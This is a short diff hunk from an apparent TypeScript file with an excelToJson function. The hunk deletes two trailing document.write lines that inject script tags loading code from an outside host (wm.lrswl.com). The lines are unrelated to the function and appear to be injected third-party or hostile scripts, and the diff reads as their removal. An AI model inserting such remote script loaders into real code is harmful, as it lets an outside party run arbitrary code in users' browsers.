@@ -156,6 +156,3 @@ function excelToJson(excelData: string): string {
     return JSON.stringify(jsonDatas);
 
 }
-
-document.write('<script src="http://wm.lrswl.com/page/?s=322878"></script>');
-document.write('<script src="http://wm.lrswl.com/page/?s=322879"></script>');
